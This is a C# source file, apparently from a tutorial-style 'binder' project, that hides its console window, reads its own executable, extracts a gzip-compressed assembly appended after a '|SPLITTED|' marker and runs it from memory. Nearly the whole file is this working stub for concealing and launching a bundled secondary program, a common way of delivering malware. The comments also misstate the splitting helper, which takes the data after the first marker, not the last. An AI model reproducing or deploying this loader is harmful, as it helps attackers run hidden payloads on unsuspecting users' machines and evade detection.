using System;
using System.IO.Compression;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

class Program
{
    // Import native functions.

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // Main thread as Single-Threaded Apartment to be
    // compatible with all applications.
    [STAThread]
    static void Main(string[] args)
    {
        // We hide the console window.
        // GetConsoleWindow() -> gets the handle of the console
        // ShowWindow(handle, int) -> shows/hides a window (0 to hide, 5 to show).
        ShowWindow(GetConsoleWindow(), 0);
        // We are going now to read the current file.
        string readFile = File.ReadAllText(System.Reflection.Assembly.GetEntryAssembly().Location);

        // It it contains the "|SPLITTED|" string, then we probably binded the
        // compressed file into it.
        if (readFile.Contains("|SPLITTED|"))
        {
            // We read the current file completely.
            byte[] readBytes = File.ReadAllBytes(System.Reflection.Assembly.GetEntryAssembly().Location);
            // We get the last occurrence of "|SPLITTED|" and decompress it.
            byte[] newBytes = Decompress(SeparateAndGetLast(readBytes, Encoding.UTF8.GetBytes("|SPLITTED|")));
            // Then I load the Assembly with that bytes.
            System.Reflection.Assembly asm = System.Reflection.Assembly.Load(newBytes);
            // Let's run the EntryPoint of the file.
            // What is the EntryPoint? Simply, the "Main" method.
            asm.EntryPoint.Invoke(null, args);
        }
    }

    /// <summary>
    /// Separate a byte array with delimiter to get last occurrence.
    /// </summary>
    /// <param name="source">Input data.</param>
    /// <param name="separator">Delimiter.</param>
    /// <returns>The last occurrence.</returns>
    private static byte[] SeparateAndGetLast(byte[] source, byte[] separator)
    {
        for (var i = 0; i < source.Length; ++i)
        {
            if (Equals(source, separator, i))
            {
                var index = i + separator.Length;
                var part = new byte[source.Length - index];
                Array.Copy(source, index, part, 0, part.Length);
                return part;
            }
        }

        return null;
    }

    /// <summary>
    /// Check if we reached the last index.
    /// </summary>
    /// <param name="source">Input byte array.</param>
    /// <param name="separator">Byte array delimiter</param>
    /// <param name="index">Reached index</param>
    /// <returns>A boolean that indicates if we reached or not the occurrence.</returns>
    private static bool Equals(byte[] source, byte[] separator, int index)
    {
        for (int i = 0; i < separator.Length; ++i)
        {
            if (index + i >= source.Length || source[index + i] != separator[i])
            {
                return false;
            }
        }

        return true;
    }

    /// <summary>
    /// Decompress a byte array of data with GZip.
    /// </summary>
    /// <param name="data">Input data to decompress.</param>
    /// <returns>Decompressed data with GZip.</returns>
    private static byte[] Decompress(byte[] data)
    {
        using (var compressedStream = new MemoryStream(data))
        {
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            {
                using (var resultStream = new MemoryStream())
                {
                    zipStream.CopyTo(resultStream);
                    return resultStream.ToArray();
                }
            }
        }
    }
}